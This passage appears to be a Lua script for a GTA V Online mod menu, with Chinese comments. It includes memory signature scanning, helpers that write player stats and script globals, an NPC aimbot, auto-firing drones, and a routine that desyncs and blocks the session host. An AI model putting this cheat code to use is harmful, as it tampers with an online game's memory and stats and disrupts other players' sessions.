            ENTITY.SET_ENTITY_VISIBLE(ball_ent, false)
            ENTITY.SET_ENTITY_VISIBLE(ball_ent1, false)
            ENTITY.SET_ENTITY_VISIBLE(obj_ent4, false)
            ENTITY.SET_ENTITY_VISIBLE(obj_ent5, false)
            ENTITY.SET_ENTITY_VISIBLE(obj_ent6, false)
            ENTITY.SET_ENTITY_VISIBLE(obj_ent7, false)
        end
        while obj_bool do
            if util.is_key_down(0x02) then
                if xrot > -30 then
                    xrot = lerp(xrot, -30, action_speed)
                    xpos = lerp(xpos, 0.7, action_speed)
                    xcpos = lerp(xcpos, 0, action_speed)
                    zpos = lerp(zpos, 0.1, action_speed)
                    yrot = lerp(yrot, -20, action_speed)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent4, true)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent5, true)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent6, true)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent7, true)
                end
                local play = players.user_ped()
                local objcoords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(play, 0, 0, 2)
                local num_shots = 36 
                local radius = 10.0 
                for i = 0, num_shots - 1 do
                    local angle = i * (360 / num_shots)
                    local angle_rad = math.rad(angle)
                    local x_offset = math.cos(angle_rad) * radius
                    local y_offset = math.sin(angle_rad) * radius
                    local z_offset = 0  
                    local objcoordsto = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(play, x_offset, y_offset, z_offset)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(objcoords.x, objcoords.y, objcoords.z, objcoordsto.x, objcoordsto.y, objcoordsto.z, 250, true, util.joaat("WEAPON_RAILGUN"), play, false, true, 1.0)
                    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(objcoords.x, objcoords.y, objcoords.z, objcoordsto.x, objcoordsto.y, objcoordsto.z, 250, true, util.joaat("weapon_raycarbine"), play, true, false, 1.0)
                end
            else
                if xrot < 90 then
                    xrot = lerp(xrot, 90, action_speed)
                    xpos = lerp(xpos, 0, action_speed)
                    xcpos = lerp(xcpos, -0.2, action_speed)
                    zpos = lerp(zpos, 0, action_speed)
                    yrot = lerp(yrot, 0, action_speed)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent4, false)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent5, false)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent6, false)
                    ENTITY.SET_ENTITY_VISIBLE(obj_ent7, false)
                end
            end
            local play = players.user_ped()
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ball_ent, play, 0, 0, -0.2, 0.6, 0, xrot, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent, ball_ent, 0, 0.3, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent2, obj_ent, 0, xpos, 0, zpos, 0, yrot, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent4, obj_ent2, 0, xcpos, 0, 0.03, 0, 92, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent6, obj_ent2, 0, xcpos - 0.1, 0, 0, 0, 95, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(ball_ent1, play, 0, 0, -0.2, 0.6, 0, xrot, 180, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent1, ball_ent1, 0, 0.3, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent3, obj_ent1, 0, xpos, 0, zpos, 0, yrot, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent5, obj_ent3, 0, xcpos, 0, 0.03, 0, 92, 0, false, false, false, false, 2, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(obj_ent7, obj_ent3, 0, xcpos - 0.1, 0, 0, 0, 95, 0, false, false, false, false, 2, true)
            wait()
        end
        obj_bool = false
    else
        entities.delete_by_handle(obj_ent)
        entities.delete_by_handle(obj_ent1)
        entities.delete_by_handle(obj_ent2)
        entities.delete_by_handle(obj_ent3)
        entities.delete_by_handle(obj_ent4)
        entities.delete_by_handle(obj_ent5)
        entities.delete_by_handle(obj_ent6)
        entities.delete_by_handle(obj_ent7)
    end
end
--实体池显示
rect_position = {x = 0.005, y = 0.01} 
rect_size = {width = 0.12, height = 0.37} 
font_scale = 0.5 
previous_mouse_y = 0
mouse_control_enabled = false 
function on_mouse_control_change(state)
    mouse_control_enabled = state
end

function handle_inputs2()
    if mouse_control_enabled then
        native_invoker.unified_void(0, 1, false, 0xFE99B66D079CF6BC, "iib")
        native_invoker.unified_void(0, 2, disableRelatedActions, 0xFE99B66D079CF6BC, "iib")
    end
    if native_invoker.unified_bool(1, 0xA571D46727E2B718, "i") and mouse_control_enabled then
        native_invoker.unified_void(0xAAE7CE1D63167423, "")
        native_invoker.unified_void(1, 0x8DB8CFFD58B62552, "i")
        local res_x, res_y = get_screen_resolution()
        local mouse_y = native_invoker.unified_float(0, 240, 0xEC3C9B8D5327B563, "ii")
        local current_mouse_y = mouse_y * res_y 
        if util.is_key_down(0x01) then 
            local mouse_x = native_invoker.unified_float(0, 239, 0xEC3C9B8D5327B563, "ii") 
            local pixel_x = mouse_x * res_x
            local pixel_y = current_mouse_y
            rect_position.x = pixel_x / res_x
            rect_position.y = pixel_y / res_y
        end
        if util.is_key_down(0x02) then 
            local delta_y = current_mouse_y - previous_mouse_y
            font_scale = math.max(0.1, font_scale - delta_y * 0.01) 
        end
        previous_mouse_y = current_mouse_y
    end
end

function shitichi()
    handle_inputs2()
    local GAME <const> = memory.read_string(memory.rip(memory.scan("4C 8D 05 ? ? ? ? 48 8D 15 ? ? ? ? 48 8B C8 E8 ? ? ? ? 48 8D 15 ? ? ? ? 48 8D 4C 24 20 E8") + 3))
    local VERSIONS <const> = memory.read_string(memory.rip(memory.scan("8B C3 33 D2 C6 44 24 20") + 0x24))
    local replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
    local pedInterface = memory.read_long(replayInterface + 0x0018)
    local vehInterface = memory.read_long(replayInterface + 0x0010)
    local objectInterface = memory.read_long(replayInterface + 0x0028)
    local function draw_line(x1, y1, x2, y2)
        directx.draw_line(rect_position.x + x1, rect_position.y + y1, rect_position.x + x2, rect_position.y + y2, 1, 1, 1, 1 * 0.2)
    end
    local function draw_text(x, y, text, color)
        directx.draw_text(rect_position.x + x, rect_position.y + y, text, ALIGN_CENTRE, font_scale, color[1], color[2], color[3], 1, 0)
    end
    local function draw_status_line(y_offset, label, condition)
        draw_text(0.023, y_offset, "   " .. label .. " ", {1, 1, 1})
        local color = condition and {0, 1, 0} or {1, 0, 0}
        draw_text(0.102, y_offset, condition and "   启用" or "   禁用", color)
    end
    directx.draw_rect(rect_position.x + 0.005, rect_position.y, rect_size.width, rect_size.height, 1 * 0.15, 1 * 0.3, 1 * 0.5, 1 * 0.65)
    local lines = {0.05, 0.11, 0.22, 0.305}
    for _, y_offset in ipairs(lines) do
        draw_line(0.008, y_offset, 0.12, y_offset)
    end
    draw_text(0.034, 0.015, "GRANDTOURINGVIP", {1, 1, 1})
    if players.get_name(players.user()) == "InvalidPlayer" then
        directx.draw_text(rect_position.x + 0.010, rect_position.y + 0.028, "未识别到玩家", 3, font_scale, 1, 0, 0, 1, 0)
    else
        directx.draw_text(rect_position.x + 0.010, rect_position.y + 0.028, players.get_name(players.user()), 3, font_scale, 1, 1, 1, 1, 0)
    end
    draw_text(0.020, 0.068, "FPS:  ", {1, 1, 1})
    draw_text(0.040, 0.068,util.get_tps(), {1, 1, 1})
    draw_text(0.020, 0.091, "玩家: ", {1, 1, 1})
    draw_text(0.034, 0.091,#players.list(), {1, 1, 1})
    draw_text(0.045, 0.091,"/32", {1, 1, 1})
    draw_status_line(0.130, "玩家无敌", players.is_godmode(players.user()))
    draw_status_line(0.155, "人间蒸发", players.is_otr(players.user()))
    draw_status_line(0.180, "载具无敌", menu.get_value(menu.ref_by_path("Vehicle>Indestructible")))
    draw_status_line(0.205, "永不通缉", menu.get_value(menu.ref_by_path("Self>Set Wanted Level")) == 0)
    draw_text(0.020, 0.240, "  Ped池: ", {1, 1, 1})
    draw_text(0.057, 0.240, memory.read_int(pedInterface + 0x0110) .. "/" .. memory.read_int(pedInterface + 0x0108), {1, 1, 1})
    draw_text(0.020, 0.265, "   载具池: ", {1, 1, 1})
    draw_text(0.057, 0.265, memory.read_int(vehInterface + 0x0190) .. "/" .. memory.read_int(vehInterface + 0x0188), {1, 1, 1})
    draw_text(0.020, 0.290, "   物体池: ", {1, 1, 1})
    draw_text(0.057, 0.290, memory.read_int(objectInterface + 0x0168) .. "/" .. memory.read_int(objectInterface + 0x0160), {1, 1, 1})
    draw_text(0.0340, 0.325, "   游戏版本: " .. VERSIONS, {1, 1, 1})
    draw_text(0.0320, 0.350, "   在线版本: " .. GAME, {1, 1, 1})
end

--恢复功能1.70
function run_script(scriptName, stackSize) 
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(MISC.GET_HASH_KEY(scriptName)) >= 1 then
        util.toast("警告\n请勿重复启动脚本线程")
    else
    SCRIPT.REQUEST_SCRIPT(scriptName)
    repeat wait() until SCRIPT.HAS_SCRIPT_LOADED(scriptName)
    SYSTEM.START_NEW_SCRIPT(scriptName, stackSize)
    SCRIPT.SET_SCRIPT_AS_NO_LONGER_NEEDED(scriptName)
    end
end

function is_script_action(scriptName) 
    return SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(MISC.GET_HASH_KEY(scriptName))
end

function add_mp_index(stat)
    local Exceptions = {
    "MP_CHAR_STAT_RALLY_ANIM",
    "MP_CHAR_ARMOUR_1_COUNT",
    "MP_CHAR_ARMOUR_2_COUNT",
    "MP_CHAR_ARMOUR_3_COUNT",
    "MP_CHAR_ARMOUR_4_COUNT",
    "MP_CHAR_ARMOUR_5_COUNT",
    }
    for _, exception in pairs(Exceptions) do
        if stat == exception then
            return "MP" .. util.stat_get_int64("MPPLY_LAST_MP_CHAR") .. "_" .. stat 
        end
    end
    if not string.contains(stat, "MP_") and not string.contains(stat, "MPPLY_") then
        return "MP" .. util.stat_get_int64("MPPLY_LAST_MP_CHAR") .. "_" .. stat
    end
    return stat
end

function stat_set_int(stat, value)
    STATS.STAT_SET_INT(util.joaat(add_mp_index(stat)), value, true)
end

function stat_get_int(stat)
    local IntPTR = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(add_mp_index(stat)), IntPTR, -1)
    return memory.read_int(IntPTR)
end

function stat_set_bool(stat, value)
    STATS.STAT_SET_BOOL(util.joaat(add_mp_index(stat)), value, true)
end

function stat_set_float(global, value)
    memory.write_float(memory.script_global(global), value)
end

function stat_set_local(script, script_local, value)
    if memory.script_local(script, script_local) ~= 0 then
        memory.write_int(memory.script_local(script, script_local), value)
    end
end

function stat_get_local(script, script_local)
    if memory.script_local(script, script_local) ~= 0 then
        local ReadLocal = memory.read_int(memory.script_local(script, script_local))
        if ReadLocal ~= nil then
            return ReadLocal
        end
    end
end

function stat_set_masked_int(stat, value1, value2)
    STATS.STAT_SET_MASKED_INT(util.joaat(add_mp_index(stat)), value1, value2, 8, true)
end

function inputC(windowName, maxInput, defaultText)
    MISC.DISPLAY_ONSCREEN_KEYBOARD(0, windowName, "", defaultText, "", "", "", maxInput);
    while MISC.UPDATE_ONSCREEN_KEYBOARD() == 0 do util.yield_once() end
    if MISC.UPDATE_ONSCREEN_KEYBOARD() == 1 then return MISC.GET_ONSCREEN_KEYBOARD_RESULT() end
    return ""
end

function vehBigOrangeDick(plr, spawnincar)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plr)
    local ppos = ENTITY.GET_ENTITY_COORDS(ped, true) 
    ppos.x = ppos.x + 2
    local playerVeh = spawn_vehicle(0x50B0215A, ppos, 0)
    VEHICLE.SET_VEHICLE_COLOURS(playerVeh, 64, 40)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(playerVeh, "B I G")
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(playerVeh, 1)
    local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, 0, -0.690002, 2.089998, 0, 0, 90, false, false, true, false, 0, true) --1
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, 0, -6, 2.08998, 0, -22, 90, false, false, true, false, 0, true) --2
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, 0, -3.35, 2.500000, 0, -11, 90, false, false, true, false, 0, true) --3
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -0.5, -3.35, 3, 0, -11, 90, false, false, true, false, 0, true) --4
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -1, -3.35, 3.5, 0, -11, 90, false, false, true, false, 0, true) --5
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -1.5, -3.35, 4.25, 43, -11, 90, false, false, true, false, 0, true) --6
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -2, -3.35, 5, 23.25, -11, 90, false, false, true, false, 0, true) --7
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -2.5, -3.35, 5.75, 31.25, -11, 90, false, false, true, false, 0, true) --8
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -3, -3.35, 6.25, 18.5, -11, 90, false, false, true, false, 0, true) --9
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -3.5, -3.35, 6.5, 18.5, -11, 90, false, false, true, false, 0, true) --11
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -4.5, -3.35, 7, 18.5, -11, 90, false, false, true, false, 0, true) --12
	local spawnedOrange = spawn_object(0x8DA1C0E, ppos, 1)
	ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnedOrange, playerVeh, 0, -6.25, -3.35, 7.5, 9.25, -11, 90, false, false, true, false, 0, true) --13
	if (spawnincar) then
		PED.SET_PED_INTO_VEHICLE(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plr), playerVeh, -1)
	end
end

function warriorfunc(on)
    if on then
        local mypos = players.get_position(players.user())
        landmine = spawn_object(util.joaat("xs_prop_arena_landmine_01a_sf"), v3(mypos.x, mypos.y, mypos.z + 1), 1)
        landmine2 = spawn_object(util.joaat("xs_prop_arena_landmine_01a_sf"), v3(mypos.x, mypos.y, mypos.z - 0.5), 1)
        artifact = spawn_object(util.joaat("m23_1_prop_m31_artifact_01a"), v3(mypos.x, mypos.y, mypos.z - 0.5), 1)
        artifact2 = spawn_object(util.joaat("m23_1_prop_m31_artifact_01a"), v3(mypos.x, mypos.y, mypos.z - 0.5), 1)
        ped_play_animation(players.user_ped(), "move_strafe@first_person@drunk", "idle", 5.0, 1.0, -1, 3, 0.5)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), landmine, 0, 0, 0, 1.1, 0, 0, 0, true, true, false, true, 0,
            true)
        ENTITY.SET_ENTITY_HAS_GRAVITY(landmine, false)
        local currentTiltAngle, targetTiltAngle, tiltSpeed, floatAmplitude, floatSpeed, floatOffset, isFloating,
            isMoving, rotationX, rotationXx, rotationXX, lerpSpeed, ptfx = 0, 0, 0.1, 0.015, 3.0, 0, true, false, 0,
            -0.2, 0.2, 0.05, 0.3
        wait()
        loop_handler = util.create_tick_handler(function()
            local speed = 0.2
            local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
            local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            local rightV = v3.new(-forwardV.y, forwardV.x, 0)
            local delta = v3.new(0, 0, 0)
            local tiltAngle = 10 -- 倾斜角度
            request_ptfx_asset("veh_xs_vehicle_mods")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("veh_nitrous", artifact, 0, 0, 0.4, -90, 0, 0, 0,
                ptfx, false, false, false, 0, 0, 0, 0)
            request_ptfx_asset("veh_xs_vehicle_mods")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("veh_nitrous", artifact2, 0, 0, 0.4, -90, 0, 0,
                0, ptfx, false, false, false, 0, 0, 0, 0)
            local leftStart = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(landmine, -1.0, 0.5, 0)
            local leftEnd = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(landmine, -1.25, 100.0, 0.35)
            local leftStart2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(landmine, 1.0, 0.5, 0)
            local leftEnd2 = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(landmine, -1.25, 100.0, 0.35)
            if util.is_key_down(0x02) then -- 右键
                rotationX = (rotationX + 2) % 360
                rotationXx = rotationXx + (-0.5 - rotationXx) * lerpSpeed
                rotationXX = rotationXX + (0.5 - rotationXX) * lerpSpeed
                ENTITY.ATTACH_ENTITY_TO_ENTITY(landmine2, landmine, 0, 0, 0, 0, 180, 0, rotationX, true, true, false,
                    true, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(artifact, landmine, 0, rotationXx - 0.5, -0.3, 0, 90, -rotationX, 0,
                    true, true, false, true, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(artifact2, landmine, 0, rotationXX + 0.5, -0.3, 0, 90, rotationX, 0,
                    true, true, false, true, 0, true)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(leftStart.x, leftStart.y, leftStart.z, leftEnd.x, leftEnd.y,
                    leftEnd.z, 1, true, util.joaat("weapon_raycarbine"), players.user_ped(), true, false, 1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(leftStart2.x, leftStart2.y, leftStart2.z, leftEnd2.x,
                    leftEnd2.y, leftEnd2.z, 1, true, util.joaat("weapon_raycarbine"), players.user_ped(), true, false, 1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(leftStart.x, leftStart.y, leftStart.z, leftEnd.x, leftEnd.y,
                    leftEnd.z, 1, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), true, false, 1)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(leftStart2.x, leftStart2.y, leftStart2.z, leftEnd2.x,
                    leftEnd2.y, leftEnd2.z, 1, true, util.joaat("WEAPON_RAILGUN"), players.user_ped(), true, false, 1)
            else
                rotationX = (rotationX + 2) % 360
                rotationXx = rotationXx + (-0.2 - rotationXx) * lerpSpeed
                rotationXX = rotationXX + (0.2 - rotationXX) * lerpSpeed
                ENTITY.ATTACH_ENTITY_TO_ENTITY(landmine2, landmine, 0, 0, 0, 0, 180, 0, rotationX, true, true, false,
                    true, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(artifact, landmine, 0, rotationXx, -0.3, 0, 90, -rotationX, 0, true,
                    true, false, true, 0, true)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(artifact2, landmine, 0, rotationXX, -0.3, 0, 90, rotationX, 0, true,
                    true, false, true, 0, true)
            end
            if PAD.IS_CONTROL_PRESSED(0, 61) then
                speed = 1.5
            end
            isMoving = false
            -- W 键前进
            if PAD.IS_CONTROL_PRESSED(0, 32) then
                isFloating = false
                isMoving = true
                delta = delta:add(v3.new(forwardV):mul(speed))
            end
            -- S 键后退
            if PAD.IS_CONTROL_PRESSED(0, 33) then
                isFloating = false
                isMoving = true
                delta = delta:add(v3.new(forwardV):mul(-speed))
            end
            -- A 键左移
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                isFloating = false
                isMoving = true
                targetTiltAngle = -tiltAngle
                delta = delta:add(v3.new(rightV):mul(speed))
            end
            -- D 键右移
            if PAD.IS_CONTROL_PRESSED(0, 35) then
                isFloating = false
                isMoving = true
                targetTiltAngle = tiltAngle
                delta = delta:add(v3.new(rightV):mul(-speed))
            end
            if not PAD.IS_CONTROL_PRESSED(0, 34) and not PAD.IS_CONTROL_PRESSED(0, 35) then
                targetTiltAngle = 0
            end
            -- 空格键上升
            if PAD.IS_CONTROL_PRESSED(0, 22) then
                isFloating = false
                isMoving = true
                local objPos = ENTITY.GET_ENTITY_COORDS(landmine, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(landmine, objPos.x, objPos.y, objPos.z + speed, true, true, true,
                    true)
            end
            -- Ctrl 键下降
            if PAD.IS_CONTROL_PRESSED(0, 36) then
                isFloating = false
                isMoving = true
                local objPos = ENTITY.GET_ENTITY_COORDS(landmine, true)
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(landmine, objPos.x, objPos.y, objPos.z - speed, true, true, true,
                    true)
            end
            currentTiltAngle = currentTiltAngle + (targetTiltAngle - currentTiltAngle) * tiltSpeed
            if not isMoving then
                isFloating = true
            end
            if isFloating then
                floatOffset = math.sin(util.current_time_millis() / 1000 * floatSpeed) * floatAmplitude
            else
                floatOffset = 0
            end
            if isMoving then
                ENTITY.SET_ENTITY_ROTATION(landmine, camrot.x, camrot.y + currentTiltAngle, camrot.z, 0, true)
            end
            local objPos = ENTITY.GET_ENTITY_COORDS(landmine, true)
            local newPos = v3.new(objPos):add(delta)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(landmine, newPos.x, newPos.y, newPos.z + floatOffset, true, true, true,
                true)
            lastPos = newPos
        end)
    else
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(artifact)
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(artifact2)
        ENTITY.SET_ENTITY_HAS_GRAVITY(landmine, false)
        util.shoot_thread(loop_handler)
        entities.delete_by_handle(landmine)
        entities.delete_by_handle(landmine2)
        entities.delete_by_handle(artifact)
        entities.delete_by_handle(artifact2)
        TASK.CLEAR_PED_TASKS(players.user_ped())
    end
end
--魔法自瞄NPC
function zimiaonpc()
    local allPeds = entities.get_all_peds_as_handles()
    local playerPed = players.user_ped()
    for _, ped in ipairs(allPeds) do
        if ped ~= playerPed and not PED.IS_PED_DEAD_OR_DYING(ped, true) then
            local result = raycast_gameplay_cam(1, 1000)
            local hit, end_coords, surface_normal, hit_entity = result[1], result[2], result[3], result[4]
            local head_coords = PED.GET_PED_BONE_COORDS(ped, 12844, 0, 0, 0) 
            local wep = WEAPON.GET_SELECTED_PED_WEAPON(players.user_ped())
            local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
            PLAYER.SET_PLAYER_LOCKON_RANGE_OVERRIDE(players.user(), 99999999.0)
            if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
                if v3.distance(end_coords, head_coords) < 20 then
                    GRAPHICS.DRAW_LINE(end_coords.x, end_coords.y, end_coords.z, head_coords.x, head_coords.y, head_coords.z, 0, 255, 0, 255)
                    GRAPHICS.DRAW_MARKER(28, head_coords.x, head_coords.y, head_coords.z, 0, 0, 0, 0, 180, 0, 0.2, 0.2, 0.2, 255, 0, 0, 255, false, true, 2, true, 0, 0, false)
                    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), false, false)  -- 加一个不会伤害友军
                    if PED.IS_PED_SHOOTING(playerPed) then
                        WEAPON.SET_WEAPON_DAMAGE_MODIFIER(wep, 10000)
                        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(
                            head_coords.x, head_coords.y, head_coords.z,
                            head_coords.x, head_coords.y, head_coords.z - 0.1,
                            dmg, true, wep, playerPed, true, false, 10000, ped, 0
                        )
                    end
                end
            end
        end
    end
end
is_host_blocked = false
function blockhost()
    if is_host_blocked then return end
    for _, pid in ipairs(players.list(false, true, true)) do
        if util.is_session_started() and pid == players.get_host() then
            local player_name = players.get_name(pid)
            if player_name then
                menu.trigger_commands("ignore" .. player_name .. " on")
                menu.trigger_commands("blocksync" .. player_name .. " on")
                menu.trigger_commands("desync" .. player_name .. " on")
                is_host_blocked = true 
            else
                return
            end
        end
    end
end
function stopblockhost()
    if not is_host_blocked then return end 
    for _, pid in ipairs(players.list(false, true, true)) do
        if util.is_session_started() and pid == players.get_host() then
            local player_name = players.get_name(pid)
            if player_name then
                menu.trigger_commands("ignore" .. player_name .. " off")
                menu.trigger_commands("blocksync" .. player_name .. " off")
                menu.trigger_commands("desync" .. player_name .. " off")
                is_host_blocked = false 
            else
                return
            end
        end
    end
end
arena_drone_left = nil
arena_drone_right = nil
function liaoji(feat) -- 僚机
    ft = feat
    if ft then
        local player_pos = players.get_position(players.user())
        local offset_left = v3(-1.5, 0.0, 1) 
        local offset_right = v3(1.5, 0.0, 1) 
        arena_drone_left = spawn_object(util.joaat("xs_prop_arena_drone_01"), player_pos, 1)
        arena_drone_right = spawn_object(util.joaat("xs_prop_arena_drone_01"), player_pos, 1)
        ENTITY.SET_ENTITY_COLLISION(arena_drone_left, false, true)
        ENTITY.SET_ENTITY_COLLISION(arena_drone_right, false, true)
        util.create_tick_handler(function()
            if not ft or (not ENTITY.DOES_ENTITY_EXIST(arena_drone_left) and not ENTITY.DOES_ENTITY_EXIST(arena_drone_right)) then
                return false
            end
            local new_player_pos = players.get_position(players.user())
            local player_heading = ENTITY.GET_ENTITY_HEADING(players.user_ped())
            local angle_rad = math.rad(player_heading)
            local offset_left_x = offset_left.x * math.cos(angle_rad) - offset_left.y * math.sin(angle_rad)
            local offset_left_y = offset_left.x * math.sin(angle_rad) + offset_left.y * math.cos(angle_rad)
            local new_drone_left_pos = v3(new_player_pos.x + offset_left_x, new_player_pos.y + offset_left_y, new_player_pos.z + offset_left.z)
            local offset_right_x = offset_right.x * math.cos(angle_rad) - offset_right.y * math.sin(angle_rad)
            local offset_right_y = offset_right.x * math.sin(angle_rad) + offset_right.y * math.cos(angle_rad)
            local new_drone_right_pos = v3(new_player_pos.x + offset_right_x, new_player_pos.y + offset_right_y, new_player_pos.z + offset_right.z)
            ENTITY.SET_ENTITY_COORDS(arena_drone_left, new_drone_left_pos.x, new_drone_left_pos.y, new_drone_left_pos.z, false, false, false, true)
            ENTITY.SET_ENTITY_COORDS(arena_drone_right, new_drone_right_pos.x, new_drone_right_pos.y, new_drone_right_pos.z, false, false, false, true)
            local npcs = entities.get_all_peds_as_handles()
            local closest_npc_left = nil
            local closest_npc_right = nil
            local closest_distance_left = 50
            local closest_distance_right = 50 
            for _, npc in ipairs(npcs) do
                if npc ~= players.user_ped() and not ENTITY.IS_ENTITY_DEAD(npc) then
                    local npc_pos = ENTITY.GET_ENTITY_COORDS(npc)
                    local distance = v3.distance(new_player_pos, npc_pos)
                    if distance < closest_distance_left then
                        closest_distance_left = distance
                        closest_npc_left = npc
                    end
                    if distance < closest_distance_right and (npc ~= closest_npc_left or closest_npc_right == nil) then
                        closest_distance_right = distance
                        closest_npc_right = npc
                    end
                end
            end
            if closest_npc_left then
                local npc_pos_left = ENTITY.GET_ENTITY_COORDS(closest_npc_left)
                local heading_to_npc_left = math.deg(math.atan2(npc_pos_left.y - new_drone_left_pos.y, npc_pos_left.x - new_drone_left_pos.x))
                ENTITY.SET_ENTITY_HEADING(arena_drone_left, heading_to_npc_left)
                drawLinev1(new_drone_left_pos, npc_pos_left)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    new_drone_left_pos.x, new_drone_left_pos.y, new_drone_left_pos.z,
                    npc_pos_left.x, npc_pos_left.y, npc_pos_left.z,
                    250, true, util.joaat("WEAPON_RAILGUN"), arena_drone_left, false, true, 1.0
                )
            else
                ENTITY.SET_ENTITY_HEADING(arena_drone_left, player_heading)
            end
            if closest_npc_right then
                local npc_pos_right = ENTITY.GET_ENTITY_COORDS(closest_npc_right)
                local heading_to_npc_right = math.deg(math.atan2(npc_pos_right.y - new_drone_right_pos.y, npc_pos_right.x - new_drone_right_pos.x))
                ENTITY.SET_ENTITY_HEADING(arena_drone_right, heading_to_npc_right)
                drawLinev1(new_drone_right_pos, npc_pos_right)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
                    new_drone_right_pos.x, new_drone_right_pos.y, new_drone_right_pos.z,
                    npc_pos_right.x, npc_pos_right.y, npc_pos_right.z,
                    250, true, util.joaat("WEAPON_RAILGUN"), arena_drone_right, false, true, 1.0
                )
            else
                ENTITY.SET_ENTITY_HEADING(arena_drone_right, player_heading)
            end
